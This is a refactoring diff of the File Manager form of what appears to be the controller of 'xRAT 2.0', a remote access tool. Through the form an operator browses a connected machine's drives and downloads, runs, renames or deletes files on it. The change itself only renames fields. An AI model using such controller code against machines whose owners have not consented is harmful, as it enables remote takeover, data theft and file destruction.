@@ -8,48 +8,48 @@ using xServer.Core.Misc;
 
 namespace xServer.Forms
 {
-    public partial class frmFileManager : Form
+    public partial class FrmFileManager : Form
     {
-        private Client cClient;
-        private string currentDir;
-        private ListViewColumnSorter lvwColumnSorter;
+        private string _currentDir;
+        private readonly Client _connectClient;
+        private readonly ListViewColumnSorter _lvwColumnSorter;
 
-        public frmFileManager(Client c)
+        public FrmFileManager(Client c)
         {
-            cClient = c;
-            cClient.Value.frmFM = this;
+            _connectClient = c;
+            _connectClient.Value.FrmFm = this;
             InitializeComponent();
 
-            lvwColumnSorter = new ListViewColumnSorter();
-            lstDirectory.ListViewItemSorter = lvwColumnSorter;
+            _lvwColumnSorter = new ListViewColumnSorter();
+            lstDirectory.ListViewItemSorter = _lvwColumnSorter;
         }
 
-        private void frmFileManager_Load(object sender, EventArgs e)
+        private void FrmFileManager_Load(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
-                new Core.Packets.ServerPackets.Drives().Execute(cClient);
+                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+                new Core.Packets.ServerPackets.Drives().Execute(_connectClient);
             }
         }
 
-        private void frmFileManager_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (cClient.Value != null)
-                cClient.Value.frmFM = null;
+            if (_connectClient.Value != null)
+                _connectClient.Value.FrmFm = null;
         }
 
         private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
-                if (cClient.Value != null)
+                if (_connectClient.Value != null)
                 {
-                    if (cClient.Value.lastDirectorySeen)
+                    if (_connectClient.Value.LastDirectorySeen)
                     {
-                        currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
-                        new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
-                        cClient.Value.lastDirectorySeen = false;
+                        _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
+                        new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                        _connectClient.Value.LastDirectorySeen = false;
                     }
                 }
             }
@@ -57,42 +57,42 @@ namespace xServer.Forms
 
         private void lstDirectory_DoubleClick(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
                 if (lstDirectory.SelectedItems.Count != 0)
                 {
                     if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                     {
-                        if (cClient.Value != null)
+                        if (_connectClient.Value != null)
                         {
-                            if (!currentDir.EndsWith(@"\"))
-                                currentDir = currentDir + @"\";
+                            if (!_currentDir.EndsWith(@"\"))
+                                _currentDir = _currentDir + @"\";
 
-                            currentDir = currentDir.Remove(currentDir.Length - 1);
+                            _currentDir = _currentDir.Remove(_currentDir.Length - 1);
 
-                            if (currentDir.Length > 2)
-                                currentDir = currentDir.Remove(currentDir.LastIndexOf(@"\"));
+                            if (_currentDir.Length > 2)
+                                _currentDir = _currentDir.Remove(_currentDir.LastIndexOf(@"\"));
 
-                            if (!currentDir.EndsWith(@"\"))
-                                currentDir = currentDir + @"\";
+                            if (!_currentDir.EndsWith(@"\"))
+                                _currentDir = _currentDir + @"\";
 
-                            new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
-                            cClient.Value.lastDirectorySeen = false;
+                            new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                            _connectClient.Value.LastDirectorySeen = false;
                         }
                     }
                     else if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir")
                     {
-                        if (cClient.Value != null)
+                        if (_connectClient.Value != null)
                         {
-                            if (cClient.Value.lastDirectorySeen)
+                            if (_connectClient.Value.LastDirectorySeen)
                             {
-                                if (currentDir.EndsWith(@"\"))
-                                    currentDir = currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
+                                if (_currentDir.EndsWith(@"\"))
+                                    _currentDir = _currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
                                 else
-                                    currentDir = currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
+                                    _currentDir = _currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
 
-                                new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
-                                cClient.Value.lastDirectorySeen = false;
+                                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                                _connectClient.Value.LastDirectorySeen = false;
                             }
                         }
                     }
@@ -102,7 +102,7 @@ namespace xServer.Forms
 
         private void ctxtDownload_Click(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
                 if (lstDirectory.SelectedItems.Count != 0)
                 {
@@ -112,7 +112,7 @@ namespace xServer.Forms
                         {
                             if (files.Tag.ToString() == "file")
                             {
-                                string path = currentDir;
+                                string path = _currentDir;
                                 if (path.EndsWith(@"\"))
                                     path = path + files.SubItems[0].Text;
                                 else
@@ -120,7 +120,7 @@ namespace xServer.Forms
 
                                 int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index;
 
-                                new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(cClient);
+                                new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
 
                                 ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
                                 
@@ -143,14 +143,14 @@ namespace xServer.Forms
             {
                 if (files.Tag.ToString() == "file")
                 {
-                    string path = currentDir;
+                    string path = _currentDir;
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    if (cClient != null)
-                        new Core.Packets.ServerPackets.StartProcess(path).Execute(cClient);
+                    if (_connectClient != null)
+                        new Core.Packets.ServerPackets.StartProcess(path).Execute(_connectClient);
                 }
             }
         }
@@ -161,7 +161,7 @@ namespace xServer.Forms
             {
                 if (files.SubItems[0].Text != "..")
                 {
-                    string path = currentDir;
+                    string path = _currentDir;
                     string newName = files.SubItems[0].Text;
                     bool isDir = files.Tag.ToString() == "dir";
 
@@ -172,13 +172,13 @@ namespace xServer.Forms
 
                     if (InputBox.Show("New name", "Enter new name:", ref newName) == System.Windows.Forms.DialogResult.OK)
                     {
-                        if (currentDir.EndsWith(@"\"))
-                            newName = currentDir + newName;
+                        if (_currentDir.EndsWith(@"\"))
+                            newName = _currentDir + newName;
                         else
-                            newName = currentDir + @"\" + newName;
+                            newName = _currentDir + @"\" + newName;
 
-                        if (cClient != null)
-                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(cClient);
+                        if (_connectClient != null)
+                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -190,7 +190,7 @@ namespace xServer.Forms
             {
                 if (files.SubItems[0].Text != "..")
                 {
-                    string path = currentDir;
+                    string path = _currentDir;
                     bool isDir = files.Tag.ToString() == "dir";
                     string text = string.Format("Are you sure you want to delete this {0}", (isDir) ? "directory?" : "file?");
 
@@ -201,8 +201,8 @@ namespace xServer.Forms
 
                     if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                     {
-                        if (cClient != null)
-                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(cClient);
+                        if (_connectClient != null)
+                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -210,16 +210,16 @@ namespace xServer.Forms
 
         private void ctxtRefresh_Click(object sender, EventArgs e)
         {
-            if (cClient != null)
+            if (_connectClient != null)
             {
-                new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
-                cClient.Value.lastDirectorySeen = false;
+                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                _connectClient.Value.LastDirectorySeen = false;
             }
         }
 
         private void btnOpenDLFolder_Click(object sender, EventArgs e)
         {
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());
+            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address.ToString());
 
             if (Directory.Exists(downloadPath))
                 Process.Start(downloadPath);
@@ -230,19 +230,19 @@ namespace xServer.Forms
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
         {
             // Determine if clicked column is already the column that is being sorted.
-            if (e.Column == lvwColumnSorter.SortColumn)
+            if (e.Column == _lvwColumnSorter.SortColumn)
             {
                 // Reverse the current sort direction for this column.
-                if (lvwColumnSorter.Order == SortOrder.Ascending)
-                    lvwColumnSorter.Order = SortOrder.Descending;
+                if (_lvwColumnSorter.Order == SortOrder.Ascending)
+                    _lvwColumnSorter.Order = SortOrder.Descending;
                 else
-                    lvwColumnSorter.Order = SortOrder.Ascending;
+                    _lvwColumnSorter.Order = SortOrder.Ascending;
             }
             else
             {
                 // Set the column number that is to be sorted; default to ascending.
-                lvwColumnSorter.SortColumn = e.Column;
-                lvwColumnSorter.Order = SortOrder.Ascending;
+                _lvwColumnSorter.SortColumn = e.Column;
+                _lvwColumnSorter.Order = SortOrder.Ascending;
             }
 
             // Perform the sort with these new sort options.
